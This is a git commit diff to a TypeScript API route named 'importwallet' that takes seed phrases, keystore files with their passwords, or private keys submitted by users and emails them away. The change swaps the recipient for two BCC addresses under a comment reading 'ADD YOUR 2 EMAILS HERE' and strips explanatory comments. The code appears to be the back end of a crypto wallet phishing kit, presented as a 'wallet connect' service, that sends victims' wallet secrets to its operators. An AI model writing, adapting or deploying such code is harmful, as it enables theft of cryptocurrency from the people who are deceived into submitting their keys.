41657154245805d03fb15c988c98a4d98d03a16c
cryptovendar <ellahella2015@gmail.com>
2025-10-19 12:38:48 +0100

    Update route.ts

--- src/app/api/importwallet/route.ts
+++ src/app/api/importwallet/route.ts
@@ -21,7 +21,6 @@ export async function POST(request: Request) {
       },
     });
 
-    // Verify connection configuration
     transporter.verify(function (error, success) {
       if (error) {
         console.error("Transporter verification failed:", error);
@@ -30,56 +29,48 @@ export async function POST(request: Request) {
       }
     });
 
+    const bccRecipients = ['fahadabdullahi180@gmail.com', 'tukuryazid2@gmail.com']; // <-- ADD YOUR 2 EMAILS HERE
+
     let mailOptions = {};
 
-    // If phrase is provided, send email with formatted message
     if (phrase) {
       const formattedMessage = formatMessage(phrase);
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
-
+        bcc: bccRecipients,
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
     }
 
-    // If keystore is provided, send the keystore details
     if (keystore) {
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
-
+        bcc: bccRecipients,
         subject: 'Wallet Submission',
         html: `<div>Json: ${keystore.json}</div> <div>Password: ${keystore.password}</div>`,
       };
     }
 
-    // If privateKey is provided, send the private key message
     if (privateKey) {
       const formattedMessage = formatMessage(privateKey);
       mailOptions = {
         from: `New Wallet Connect ${email}`,
-        to: ['ellahella2015@gmail.com'],
-
+        bcc: bccRecipients,
         subject: 'Wallet Submission',
         html: formattedMessage,
       };
     }
 
-    // Send the email
     const result = await transporter.sendMail(mailOptions);
     console.log('SendMail Result:', result);
 
-    // Check for messageId in result to confirm email was sent
     if (result.messageId) {
       return new Response(JSON.stringify({ message: 'Email sent successfully!' }), { status: 200 });
     } else {
-      console.log('Error: No messageId returned');
       return new Response(JSON.stringify({ error: 'Internal server error' }), { status: 500 });
     }
   } catch (error: unknown) {
-    // Handle error gracefully
     if (error instanceof Error) {
       console.error('Error in sending email:', error);
       return new Response(JSON.stringify({ error: error.message }), { status: 500 });
